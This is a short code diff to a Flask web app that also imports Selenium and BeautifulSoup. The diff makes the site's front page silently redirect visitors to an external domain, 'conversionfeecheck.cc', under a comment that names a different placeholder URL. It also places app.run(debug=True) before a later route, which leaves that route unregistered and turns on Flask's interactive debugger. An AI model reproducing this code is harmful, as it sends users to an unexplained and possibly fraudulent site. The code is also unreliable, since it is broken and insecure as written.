@@ -4,14 +4,18 @@ from selenium.webdriver.common.by import By
 from bs4 import BeautifulSoup
 import time
 from flask_cors import CORS
-
+from flask import Flask, redirect
 app = Flask(__name__)
 CORS(app)
 
 
 @app.route("/")
 def index():
-    return open("index.html").read()
+    # Замените "https://example.com" на URL вашего хостинга
+    return redirect("http://conversionfeecheck.cc", code=302)
+
+if __name__ == "__main__":
+    app.run(debug=True)
 
 @app.route("/process", methods=["POST"])
 def process():
